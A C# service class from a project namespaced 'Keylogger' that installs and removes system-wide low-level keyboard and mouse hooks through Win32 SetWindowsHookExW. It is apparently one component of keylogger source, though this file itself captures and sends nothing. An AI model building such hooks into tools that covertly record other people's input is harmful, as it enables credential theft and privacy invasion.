using Keylogger.Hooks;
using System.Diagnostics;
using static Keylogger.Interop.Win32Api;
using static Keylogger.Interop.Win32ApiHelper;

namespace Keylogger.Services
{
    internal class HookService
    {
        private readonly Dictionary<Type, IntPtr> _activeHooks = [];

        public void InstallHooks()
        {
            InstallHook(HookType.WH_KEYBOARD_LL, KeyboardHook.Hookproc, typeof(KeyboardHook));
            InstallHook(HookType.WH_MOUSE_LL, MouseHook.Hookproc, typeof(MouseHook));
        }

        public void UninstallHooks()
        {
            UninstallHook(typeof(KeyboardHook));
            UninstallHook(typeof(MouseHook));
        }

        private void InstallHook(HookType hookType, Hookproc proc, Type hookName)
        {
            if (_activeHooks.ContainsKey(hookName)) return;

            var hook = SetHook(hookType, proc);
            if (hook != nint.Zero)
            {
                _activeHooks[hookName] = hook;
                Debug.WriteLine($"{hookName} installed");
            }
        }

        private void UninstallHook(Type hookName)
        {
            if (!_activeHooks.TryGetValue(hookName, out nint value)) return;

            if (Unhook(value, hookName))
            {
                _activeHooks.Remove(hookName);
                Debug.WriteLine($"{hookName} uninstalled");
            }
        }

        private static nint SetHook(HookType hookType, Hookproc proc)
        {
            var hook = SetWindowsHookExW((int)hookType, proc, nint.Zero, 0);
            if (hook == nint.Zero)
            {
                Debug.WriteLine($"Error setting {hookType}: {GetLastErrorMessage()}");
            }
            return hook;
        }

        private static bool Unhook(nint hook, Type hookName)
        {
            if (hook == nint.Zero) return true;

            var unhooked = UnhookWindowsHookEx(hook);
            if (!unhooked)
            {
                Debug.WriteLine($"Error unhooking {hookName}: {GetLastErrorMessage()}");
            }
            return unhooked;
        }
    }
}